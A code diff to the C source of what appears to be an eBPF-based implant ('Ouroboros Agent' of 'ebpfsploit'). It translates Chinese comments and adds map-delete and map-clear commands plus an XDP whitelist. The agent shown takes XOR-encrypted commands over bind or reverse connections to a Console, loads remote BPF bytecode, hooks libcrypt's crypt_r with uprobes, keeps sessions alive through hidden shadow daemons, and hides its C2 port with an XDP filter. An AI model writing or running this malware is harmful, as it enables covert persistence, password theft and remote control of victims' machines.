@@ -22,31 +22,33 @@
 #define MAX_MAPS         16
 #define SHADOW_MAX_FDS   48
 
-/* ---- Pre-Shared Key (构建时自动替换) ---- */
+/* ---- Pre-Shared Key (Auto-replaced at build time) ---- */
 static const char PSK[] = "__EBPFSPLOIT_PSK__";
 
-/* ---- 命令类型 ---- */
-#define CMD_LOAD    4   /* 加载模块 */
-#define CMD_UNLOAD  5   /* 热卸载模块 */
-#define CMD_LIST    6   /* 查询活跃会话列表 */
-#define CMD_UPDATE  7   /* 运行时更新 BPF Map */
-#define RESP_MSG    8   /* Agent → Console 响应 */
-#define CMD_RECON   9   /* 请求环境侦察信息 */
-#define CMD_GET     10  /* 获取 BPF Map 值 */
-#define CMD_DUMP_MAP 11 /* 导出整个 BPF Map */
+/* ---- Command Types ---- */
+#define CMD_LOAD    4   /* Load module */
+#define CMD_UNLOAD  5   /* Hot-unload module */
+#define CMD_LIST    6   /* Query active sessions list */
+#define CMD_UPDATE  7   /* Runtime update BPF Map */
+#define RESP_MSG    8   /* Agent -> Console response */
+#define CMD_RECON   9   /* Request environment recon info */
+#define CMD_GET     10  /* Get BPF Map value */
+#define CMD_DUMP_MAP 11 /* Export entire BPF Map */
+#define CMD_DELETE  12  /* Delete specified Key from BPF Map */
+#define CMD_CLEAR   13  /* Clear BPF Map */
 
-/* ---- 通信协议结构体 ---- */
-/* 总大小：4+4+4+4+32+96 = 144 bytes */
+/* ---- Communication Protocol Structure ---- */
+/* Total size: 4+4+4+4+32+96 = 144 bytes */
 struct cmd_payload {
     uint32_t magic;
     uint32_t cmd_type;
-    uint32_t session_id;   /* load=0; unload/update=目标id */
-    uint32_t data_size;    /* load=BPF字节码大小; update=0 */
-    char     aux[32];      /* load=模块名; update=目标map名 */
-    char     config[96];   /* load=初始配置; update=[0:key_size]=key,[key_size:]=value */
+    uint32_t session_id;   /* load=0; unload/update=target id */
+    uint32_t data_size;    /* load=BPF bytecode size; update=0 */
+    char     aux[32];      /* load=module name; update=target map name */
+    char     config[96];   /* load=initial config; update=[0:key_size]=key, [key_size:]=value */
 };
 
-/* ---- 会话注册表 ---- */
+/* ---- Session Registry ---- */
 struct session {
     uint32_t          id;
     char              name[32];
@@ -83,7 +85,7 @@ static struct session *find_session(uint32_t id) {
     return NULL;
 }
 
-/* XOR 加解密（每条消息独立，key 位置从 0 开始） */
+/* XOR Encryption/Decryption (Independent for each message, key position starts from 0) */
 static void xor_crypt(void *data, size_t len) {
     unsigned char *d = (unsigned char *)data;
     size_t psk_len = strlen(PSK);
@@ -92,7 +94,7 @@ static void xor_crypt(void *data, size_t len) {
         d[i] ^= PSK[i % psk_len];
 }
 
-/* 发送 JSON 响应（带 4 字节长度前缀，均 XOR 加密） */
+/* Send JSON response (with 4-byte length prefix, both XOR encrypted) */
 void send_resp(int sock, const char *json_str) {
     uint32_t len = strlen(json_str);
     uint32_t enc_len = len;
@@ -108,7 +110,7 @@ void send_resp(int sock, const char *json_str) {
 
 /* ==================== Shadow Daemon Infrastructure ==================== */
 
-/* 影子守护进程通信的元数据结构 */
+/* Shadow daemon communication metadata structure */
 struct shadow_meta {
     uint32_t session_id;
     char     name[32];
@@ -117,7 +119,7 @@ struct shadow_meta {
     char     map_names[MAX_MAPS][32];
 };
 
-/* 构造抽象命名空间 socket 地址 (不产生任何磁盘文件) */
+/* Construct abstract namespace socket address (does not produce any disk files) */
 static socklen_t make_shadow_addr(struct sockaddr_un *addr, uint32_t sid) {
     memset(addr, 0, sizeof(*addr));
     addr->sun_family = AF_UNIX;
@@ -126,7 +128,7 @@ static socklen_t make_shadow_addr(struct sockaddr_un *addr, uint32_t sid) {
     return offsetof(struct sockaddr_un, sun_path) + 1 + n;
 }
 
-/* SCM_RIGHTS: 跨进程发送 FD */
+/* SCM_RIGHTS: Send FD across processes */
 static int send_fds(int sock, struct shadow_meta *meta, int *fds, int num_fds) {
     struct msghdr msg = {0};
     struct iovec iov = { .iov_base = meta, .iov_len = sizeof(*meta) };
@@ -147,7 +149,7 @@ static int send_fds(int sock, struct shadow_meta *meta, int *fds, int num_fds) {
     return ret;
 }
 
-/* SCM_RIGHTS: 跨进程接收 FD */
+/* SCM_RIGHTS: Receive FD across processes */
 static int recv_fds(int sock, struct shadow_meta *meta, int *fds, int max_fds) {
     struct msghdr msg = {0};
     struct iovec iov = { .iov_base = meta, .iov_len = sizeof(*meta) };
@@ -170,7 +172,7 @@ static int recv_fds(int sock, struct shadow_meta *meta, int *fds, int max_fds) {
     return num;
 }
 
-/* 影子守护进程：抱着 FD 不死，响应新 Agent 的恢复请求 */
+/* Shadow Daemon: Holds FD until death, responds to recovery requests from new Agent */
 static void run_shadow_daemon(struct shadow_meta *meta, int *fds, int num_fds) {
     setsid();
     int null_fd = open("/dev/null", O_RDWR);
@@ -195,7 +197,7 @@ static void run_shadow_daemon(struct shadow_meta *meta, int *fds, int num_fds) {
     }
 }
 
-/* 从已有的影子守护进程恢复会话 */
+/* Recover session from existing shadow daemon */
 static void recover_from_shadows(void) {
     for (uint32_t sid = 1; sid < 256; sid++) {
         struct sockaddr_un addr;
@@ -210,7 +212,7 @@ static void recover_from_shadows(void) {
         struct shadow_meta meta;
         int fds[SHADOW_MAX_FDS];
         int num = recv_fds(sock, &meta, fds, SHADOW_MAX_FDS);
-        /* 获取影子进程的 PID */
+        /* Get shadow process PID */
         pid_t shadow_pid = 0;
         struct ucred cred;
         socklen_t cred_len = sizeof(cred);
@@ -241,7 +243,7 @@ static void recover_from_shadows(void) {
     }
 }
 
-/* 按 map 名查找 FD (兼容 obj 模式和影子恢复模式) */
+/* Find FD by map name (compatible with obj mode and shadow recovery mode) */
 static int find_map_fd(struct session *s, const char *map_name,
                        size_t *key_size, size_t *val_size) {
     if (s->obj) {
@@ -266,19 +268,50 @@ static int find_map_fd(struct session *s, const char *map_name,
     return -1;
 }
 
-/* ---- 初始配置：对已知配置 Map（key=0）写入 config 数据 ---- */
+/* ---- Initial Config: Write config data to known configuration Maps ---- */
 static void apply_initial_config(struct bpf_object *obj, const char *config) {
+    if (!config || !config[0]) return;
+
     struct bpf_map *map;
     bpf_object__for_each_map(map, obj) {
         const char *n = bpf_map__name(map);
-        /* Array maps used as config slots */
-        if (strstr(n, "inject_payload") || strstr(n, "master_password")) {
+        /* 若 map 包含 "target", "payload", "password" 等关键字，自动写入初始配置 */
+        if (strstr(n, "target") || strstr(n, "payload") || strstr(n, "password")) {
             int fd = bpf_map__fd(map);
-            if (fd >= 0) {
+            if (fd < 0) continue;
+
+            size_t ksz = bpf_map__key_size(map);
+            size_t vsz = bpf_map__value_size(map);
+            enum bpf_map_type type = bpf_map__type(map);
+
+            if (type == BPF_MAP_TYPE_HASH) {
+                uint64_t val_to_insert = 0;
+                uint32_t mark = 1;
+                /* Quick check for shadow_walker: 'target' with 8-byte key */
+                if (strcmp(n, "target") == 0 && ksz == 8) {
+                    memcpy(&val_to_insert, config, 8);
+                }
+                /* Try to parse: string first, then binary */
+                else if (isdigit((unsigned char)config[0])) {
+                    val_to_insert = strtoull(config, NULL, 0);
+                } else {
+                    /* Handle packed 4/8 byte integers (e.g. struct.pack('<I', ...)) */
+                    memcpy(&val_to_insert, config, (ksz <= 8 ? ksz : 8));
+                }
+
+                /* Only insert if value is non-zero (Logic default, PID/Port 0 are not valid business targets) */
+                if (val_to_insert != 0) {
+                    if (ksz <= 8) {
+                        bpf_map_update_elem(fd, &val_to_insert, &mark, BPF_ANY);
+                        printf("[+] XDP/Agent: Applied initial target %lu to Hash map '%s'\n", (unsigned long)val_to_insert, n);
+                    }
+                }
+            } else if (type == BPF_MAP_TYPE_ARRAY) {
+                /* For Array Map: write to key 0 */
                 uint32_t key = 0;
-                size_t vsz = bpf_map__value_size(map);
                 if (vsz > 96) vsz = 96;
-                bpf_map__update_elem(map, &key, sizeof(key), config, vsz, BPF_ANY);
+                bpf_map_update_elem(fd, &key, config, BPF_ANY);
+                printf("[+] XDP/Agent: Applied initial config to Array map '%s'\n", n);
             }
         }
     }
@@ -299,7 +332,7 @@ static void handle_load(int sock, struct cmd_payload *cmd) {
         send_resp(sock, "{\"error\":\"recv blob\"}");
         return;
     }
-    xor_crypt(buf, cmd->data_size);  /* 解密 BPF 字节码 */
+    xor_crypt(buf, cmd->data_size);  /* Decrypt BPF bytecode */
 
     struct session *s = alloc_session();
     if (!s) {
@@ -311,7 +344,7 @@ static void handle_load(int sock, struct cmd_payload *cmd) {
     strncpy(s->name, cmd->aux[0] ? cmd->aux : "unknown", 31);
 
     struct bpf_object *obj = bpf_object__open_mem(buf, cmd->data_size, NULL);
-    free(buf); /* libbpf 内部已复制，可安全释放 */
+    free(buf); /* libbpf has copied internally, can be safely freed */
 
     if (libbpf_get_error(obj)) {
         s->active = 0;
@@ -319,7 +352,7 @@ static void handle_load(int sock, struct cmd_payload *cmd) {
         return;
     }
 
-    /* 加载前 patch .data（兼容旧方式） */
+    /* Patch .data before loading (compatible with legacy method) */
     struct bpf_map *data_map = bpf_object__find_map_by_name(obj, ".data");
     if (data_map) {
         size_t msz = bpf_map__value_size(data_map);
@@ -341,11 +374,10 @@ static void handle_load(int sock, struct cmd_payload *cmd) {
         return;
     }
 
-    /* 对配置 Map 写入初始值（运行时 patch） */
-    if (cmd->config[0])
-        apply_initial_config(obj, cmd->config);
+    /* Write initial value to configuration Map (runtime patch) */
+    apply_initial_config(obj, cmd->config);
 
-    /* 挂载所有 BPF 程序，持久化 link */
+    /* Attach all BPF programs, persist link */
     struct bpf_program *prog;
     bpf_object__for_each_program(prog, obj) {
         struct bpf_link *lk = NULL;
@@ -368,9 +400,9 @@ static void handle_load(int sock, struct cmd_payload *cmd) {
             }
         } else if (ptype == BPF_PROG_TYPE_KPROBE && sec_name &&
                    (strstr(sec_name, "uprobe") || strstr(sec_name, "uretprobe"))) {
-            /* uprobe/uretprobe 需要指定二进制路径 */
+            /* uprobe/uretprobe requires specified binary path */
             int is_retprobe = (strstr(sec_name, "uretprobe") != NULL);
-            /* 尝试常见的 libcrypt 路径 */
+            /* Try common libcrypt paths */
             const char *crypt_paths[] = {
                 "/lib/x86_64-linux-gnu/libcrypt.so.1",
                 "/lib64/libcrypt.so.1",
@@ -387,7 +419,7 @@ static void handle_load(int sock, struct cmd_payload *cmd) {
                 }
             }
             if (lib_path) {
-                /* 动态抓取 crypt_r 的偏移量，兼容任意类型的导出符号，以及带版本号的后缀(如 @@XCRYPT_2.0) */
+                /* Dynamically grab crypt_r offset, compatible with any exported symbol type and versioned suffixes (e.g. @@XCRYPT_2.0) */
                 char nm_cmd[512];
                 snprintf(nm_cmd, sizeof(nm_cmd),
                     "nm -D '%s' 2>/dev/null | grep -E ' [a-zA-Z] crypt_r(@@.*)?$' | grep -v ' U ' | head -1 | awk '{print $1}'",
@@ -477,7 +509,7 @@ static void handle_unload(int sock, struct cmd_payload *cmd) {
     struct session *s = find_session(cmd->session_id);
     if (!s) { send_resp(sock, "{\"error\":\"session not found\"}"); return; }
 
-    /* 杀死影子守护进程 */
+    /* Kill shadow daemon */
     if (s->shadow_pid > 0) {
         kill(s->shadow_pid, SIGKILL);
         waitpid(s->shadow_pid, NULL, 0);
@@ -647,12 +679,62 @@ static void handle_update(int sock, struct cmd_payload *cmd) {
     send_resp(sock, resp);
 }
 
-/* ---- CMD_RECON: 环境侦察 ---- */
+/* ---- CMD_DELETE ---- */
+static void handle_delete(int sock, struct cmd_payload *cmd) {
+    struct session *s = find_session(cmd->session_id);
+    if (!s) { send_resp(sock, "{\"error\":\"session invalid\"}"); return; }
+
+    const char *map_name = cmd->aux;
+    size_t ksz = 0;
+    int fd = find_map_fd(s, map_name, &ksz, NULL);
+
+    if (fd < 0 || ksz == 0 || ksz > 8) {
+        send_resp(sock, "{\"error\":\"invalid map meta for delete\"}");
+        return;
+    }
+
+    int err = bpf_map_delete_elem(fd, cmd->config);
+    if (err) {
+        char msg[64];
+        snprintf(msg, sizeof(msg), "{\"error\":\"delete_elem %d\"}", err);
+        send_resp(sock, msg);
+        return;
+    }
+
+    send_resp(sock, "{\"ok\":true}");
+}
+
+/* ---- CMD_CLEAR ---- */
+static void handle_clear(int sock, struct cmd_payload *cmd) {
+    struct session *s = find_session(cmd->session_id);
+    if (!s) { send_resp(sock, "{\"error\":\"session invalid\"}"); return; }
+
+    const char *map_name = cmd->aux;
+    size_t ksz = 0;
+    int fd = find_map_fd(s, map_name, &ksz, NULL);
+
+    if (fd < 0 || ksz == 0 || ksz > 256) {
+        send_resp(sock, "{\"error\":\"invalid map meta for clear\"}");
+        return;
+    }
+
+    uint8_t key[256], next_key[256];
+    memset(key, 0, sizeof(key));
+
+    /* Iteratively delete all elements */
+    while (bpf_map_get_next_key(fd, NULL, next_key) == 0) {
+        bpf_map_delete_elem(fd, next_key);
+    }
+
+    send_resp(sock, "{\"ok\":true}");
+}
+
+/* ---- CMD_RECON: Environment Reconnaissance ---- */
 static int file_exists(const char *path) { return access(path, F_OK) == 0; }
 static int file_readable(const char *path) { return access(path, R_OK) == 0; }
 
 static int check_cap(int cap_id) {
-    /* 简单检查：读取 /proc/self/status 中 CapEff 位 */
+    /* Simple check: Read CapEff bit from /proc/self/status */
     FILE *fp = fopen("/proc/self/status", "r");
     if (!fp) return 0;
     char line[256];
@@ -669,7 +751,7 @@ static void read_lsm_list(char *buf, size_t sz) {
     FILE *fp = fopen("/sys/kernel/security/lsm", "r");
     if (fp) {
         if (fgets(buf, sz, fp)) {
-            /* 去除换行 */
+            /* Remove newline */
             char *nl = strchr(buf, '\n');
             if (nl) *nl = '\0';
         }
@@ -694,7 +776,7 @@ static void handle_recon(int sock) {
                          file_exists("/sys/kernel/tracing/uprobe_events");
     int has_kprobe     = file_exists("/sys/kernel/debug/tracing/kprobe_events") ||
                          file_exists("/sys/kernel/tracing/kprobe_events");
-    int has_xdp        = cap_net_admin || cap_sys_admin; /* XDP 需要网络权限 */
+    int has_xdp        = cap_net_admin || cap_sys_admin; /* XDP requires net privileges */
 
     char lsm_list[256] = "";
     read_lsm_list(lsm_list, sizeof(lsm_list));
@@ -724,7 +806,8 @@ static void handle_recon(int sock) {
             "\"kprobe\":%d,"
             "\"xdp\":%d,"
             "\"lsm_bpf\":%d,"
-            "\"probe_write\":%d"
+            "\"probe_write\":%d,"
+            "\"kprobe_override\":%d"
           "},"
           "\"lsm_modules\":\"%s\""
         "}"
@@ -733,7 +816,7 @@ static void handle_recon(int sock) {
         is_root,
         cap_bpf, cap_sys_admin, cap_mac_admin, cap_net_admin,
         has_bpf_fs, has_btf, has_tracefs, has_uprobe, has_kprobe,
-        has_xdp, has_lsm_bpf, has_probe_write,
+        has_xdp, has_lsm_bpf, has_probe_write, has_kprobe,
         lsm_list
     );
     send_resp(sock, resp);
@@ -783,13 +866,23 @@ static void print_help(const char *prog) {
     );
 }
 
-/* 处理单个连接上的命令循环 */
-static void handle_connection(int c_sock) {
+/* 前向声明（定义在 auto_load_stealth 之后） */
+static void stealth_allow_ip(uint32_t ip_net);
+
+/* Handle command loop on a single connection
+ * peer_ip: Peer IP (network byte order), used to add to XDP whitelist after Console validation */
+static void handle_connection(int c_sock, uint32_t peer_ip) {
     printf("[+] Console connected\n");
+    int whitelisted = 0;  /* 是否已把该 IP 加入白名单 */
     struct cmd_payload cmd;
     while (recv(c_sock, &cmd, sizeof(cmd), MSG_WAITALL) == sizeof(cmd)) {
-        xor_crypt(&cmd, sizeof(cmd));  /* 解密命令包 */
+        xor_crypt(&cmd, sizeof(cmd));  /* Decrypt command packet */
         if (cmd.magic != MAGIC) continue;
+        /* First valid command verified, now confirmed as genuine Console */
+        if (!whitelisted) {
+            stealth_allow_ip(peer_ip);
+            whitelisted = 1;
+        }
         switch (cmd.cmd_type) {
             case CMD_LOAD:   handle_load(c_sock, &cmd);   break;
             case CMD_UNLOAD: handle_unload(c_sock, &cmd); break;
@@ -798,6 +891,8 @@ static void handle_connection(int c_sock) {
             case CMD_RECON:  handle_recon(c_sock);         break;
             case CMD_GET:    handle_get(c_sock, &cmd);     break;
             case CMD_DUMP_MAP: handle_dump_map(c_sock, &cmd); break;
+            case CMD_DELETE: handle_delete(c_sock, &cmd); break;
+            case CMD_CLEAR:  handle_clear(c_sock, &cmd);  break;
             default:
                 printf("[!] Unknown cmd_type=%u\n", cmd.cmd_type);
         }
@@ -806,7 +901,8 @@ static void handle_connection(int c_sock) {
     close(c_sock);
 }
 
-/* Bind 模式：监听端口，等待 Console 连接 */
+
+/* Bind Mode: Listen on port, wait for Console connection */
 static int run_bind(int port) {
     int l_sock = socket(AF_INET, SOCK_STREAM, 0);
     if (l_sock < 0) { perror("socket"); return 1; }
@@ -827,14 +923,17 @@ static int run_bind(int port) {
     printf("[+] Ouroboros Agent AWAKE — Bind mode on port %d\n", port);
 
     while (1) {
-        int c_sock = accept(l_sock, NULL, NULL);
+        struct sockaddr_in peer_addr;
+        socklen_t peer_len = sizeof(peer_addr);
+        int c_sock = accept(l_sock, (struct sockaddr *)&peer_addr, &peer_len);
         if (c_sock < 0) { perror("accept"); continue; }
-        handle_connection(c_sock);
+        /* Whitelist locking deferred until first valid command verified to prevent nmap -sT false positives */
+        handle_connection(c_sock, peer_addr.sin_addr.s_addr);
     }
     return 0;
 }
 
-/* Reverse 模式：主动回连 Console，断线自动重连 */
+/* Reverse Mode: Actively connect back to Console, auto-reconnect on disconnect */
 static int run_reverse(const char *host, int port) {
     printf("[+] Ouroboros Agent AWAKE — Reverse mode → %s:%d\n", host, port);
 
@@ -859,25 +958,26 @@ static int run_reverse(const char *host, int port) {
             sleep(5);
             continue;
         }
-
-        handle_connection(sock);
+        /* Whitelist locking deferred until first valid command (already pre-written in main for reverse mode) */
+        handle_connection(sock, addr.sin_addr.s_addr);
         printf("[*] Reconnecting in 5s...\n");
         sleep(5);
     }
     return 0;
 }
 
-/* ---- XDP 自动隐身：Agent 启动时加载 stealth_link.bpf.o ---- */
-static struct bpf_object *stealth_obj = NULL;
-static struct bpf_link   *stealth_link = NULL;
+#include "stealth_link.skel.h"
 
-/* 自动检测默认路由网卡名 */
+/* ---- XDP Auto Stealth: Embed and load stealth_link when Agent starts ---- */
+static struct stealth_link_bpf *stealth_skel = NULL;
+
+/* Auto detect default route interface name */
 static const char *detect_default_iface(void) {
     static char iface[32] = "eth0";
     FILE *fp = fopen("/proc/net/route", "r");
     if (!fp) return iface;
     char line[256];
-    fgets(line, sizeof(line), fp); /* 跳过表头 */
+    fgets(line, sizeof(line), fp); /* Skip header */
     while (fgets(line, sizeof(line), fp)) {
         char name[32];
         unsigned long dest;
@@ -896,7 +996,7 @@ static void auto_load_stealth(int c2_port, const char *ifname) {
         return;
     }
 
-    /* 权限检查 */
+    /* Privilege check */
     if (getuid() != 0) {
         printf("[*] XDP stealth: not root, skipping\n");
         return;
@@ -912,73 +1012,64 @@ static void auto_load_stealth(int c2_port, const char *ifname) {
         return;
     }
 
-    /* 搜索 stealth_link.bpf.o 的路径 */
-    const char *paths[] = {
-        "stealth_link.bpf.o",
-        "/opt/ebpfsploit/console/modules/stealth_link.bpf.o",
-        "modules/stealth_link.bpf.o",
-        "../console/modules/stealth_link.bpf.o",
-        NULL
-    };
-
-    const char *path = NULL;
-    for (int i = 0; paths[i]; i++) {
-        if (access(paths[i], R_OK) == 0) { path = paths[i]; break; }
-    }
-    if (!path) {
-        printf("[*] stealth_link.bpf.o not found, XDP stealth disabled\n");
+    /* Load directly from embedded Skeleton, no longer searching for files */
+    printf("[*] Loading embedded XDP stealth...\n");
+    stealth_skel = stealth_link_bpf__open();
+    if (!stealth_skel) {
+        printf("[-] Failed to open embedded stealth skeleton\n");
         return;
     }
 
-    printf("[*] Loading XDP stealth from %s...\n", path);
-    stealth_obj = bpf_object__open(path);
-    if (libbpf_get_error(stealth_obj)) {
-        printf("[-] Failed to open stealth_link.bpf.o\n");
-        stealth_obj = NULL;
+    if (stealth_link_bpf__load(stealth_skel)) {
+        printf("[-] Failed to load embedded stealth skeleton\n");
+        stealth_link_bpf__destroy(stealth_skel);
+        stealth_skel = NULL;
         return;
     }
 
-    if (bpf_object__load(stealth_obj) != 0) {
-        printf("[-] Failed to load stealth_link.bpf.o\n");
-        bpf_object__close(stealth_obj);
-        stealth_obj = NULL;
+    /* Attach to interface */
+    stealth_skel->links.stealth_link_xdp = bpf_program__attach_xdp(stealth_skel->progs.stealth_link_xdp, ifidx);
+    if (libbpf_get_error(stealth_skel->links.stealth_link_xdp)) {
+        printf("[-] Failed to attach embedded XDP to %s\n", ifname);
+        stealth_link_bpf__destroy(stealth_skel);
+        stealth_skel = NULL;
         return;
     }
 
-    struct bpf_program *prog = bpf_object__find_program_by_name(stealth_obj, "stealth_link_xdp");
-    if (!prog) prog = bpf_object__next_program(stealth_obj, NULL);
-    if (!prog) {
-        printf("[-] No XDP program found in stealth_link.bpf.o\n");
-        bpf_object__close(stealth_obj);
-        stealth_obj = NULL;
-        return;
-    }
+    printf("[+] XDP stealth (embedded) attached to %s\n", ifname);
 
-    stealth_link = bpf_program__attach_xdp(prog, ifidx);
-    if (libbpf_get_error(stealth_link)) {
-        printf("[-] Failed to attach XDP to %s (ifindex %u)\n", ifname, ifidx);
-        stealth_link = NULL;
-        bpf_object__close(stealth_obj);
-        stealth_obj = NULL;
-        return;
-    }
-
-    printf("[+] XDP stealth attached to %s (ifindex %u)\n", ifname, ifidx);
-
-    struct bpf_map *ports_map = bpf_object__find_map_by_name(stealth_obj, "c2_ports");
-    if (ports_map) {
-        uint16_t port_key = (uint16_t)c2_port;
-        uint32_t val = 1;
-        bpf_map__update_elem(ports_map, &port_key, sizeof(port_key),
-                             &val, sizeof(val), BPF_ANY);
+    /* Initialize hidden port */
+    uint16_t port_key = (uint16_t)c2_port;
+    uint32_t val = 1;
+    if (bpf_map__update_elem(stealth_skel->maps.target, &port_key, sizeof(port_key), &val, sizeof(val), BPF_ANY) == 0) {
         printf("[+] C2 port %d hidden from unauthorized access\n", c2_port);
     }
 }
 
 static void cleanup_stealth(void) {
-    if (stealth_link) { bpf_link__destroy(stealth_link); stealth_link = NULL; }
-    if (stealth_obj)  { bpf_object__close(stealth_obj);  stealth_obj = NULL; }
+    if (stealth_skel) {
+        stealth_link_bpf__destroy(stealth_skel);
+        stealth_skel = NULL;
+    }
 }
+
+/* Add Console IP (network byte order) to XDP whitelist and activate filter lock */
+static void stealth_allow_ip(uint32_t ip_net) {
+    if (!stealth_skel) return;
+
+    /* 1. Write IP whitelist */
+    uint32_t val = 1;
+    if (bpf_map__update_elem(stealth_skel->maps.whitelist, &ip_net, sizeof(ip_net), &val, sizeof(val), BPF_ANY) == 0) {
+        struct in_addr ia = { .s_addr = ip_net };
+        printf("[+] XDP: %s whitelisted\n", inet_ntoa(ia));
+    }
+
+    /* 2. Activate lock flag */
+    uint32_t key = 0, locked = 1;
+    bpf_map__update_elem(stealth_skel->maps.whitelist_count, &key, sizeof(key), &locked, sizeof(locked), BPF_ANY);
+    printf("[+] XDP: whitelist locked — unauthorized IPs will be RST'd\n");
+}
+
 
 int main(int argc, char *argv[]) {
     if (argc < 2) {
@@ -994,10 +1085,10 @@ int main(int argc, char *argv[]) {
     memset(sessions, 0, sizeof(sessions));
 
     /*
-     * 参数解析：
+     * Parameter parsing:
      *   -b <PORT> [-i <iface>]
      *   -r <IP> <PORT> [-i <iface>]
-     *   <PORT> [-i <iface>]        (兼容旧版)
+     *   <PORT> [-i <iface>]        (Legacy compatibility)
      */
     const char *mode = NULL;
     const char *host = NULL;
@@ -1032,7 +1123,15 @@ int main(int argc, char *argv[]) {
 
     auto_load_stealth(port, xdp_iface);
 
-    /* 从影子守护进程恢复断联存活的会话 */
+    /* Reverse Mode: Known Console IP (the host from -r), immediately pre-write whitelist and lock.
+     * Bind Mode: Initial whitelist is empty, XDP allows everyone, automatically locks after Console connects. */
+    if (mode && strcmp(mode, "reverse") == 0 && host) {
+        struct in_addr ia;
+        if (inet_pton(AF_INET, host, &ia) == 1)
+            stealth_allow_ip(ia.s_addr);  /* 预写 Console IP，其他人一开始就被 RST */
+    }
+
+    /* Recover surviving sessions from Shadow Daemon after disconnection */
     recover_from_shadows();
 
     if (strcmp(mode, "bind") == 0)
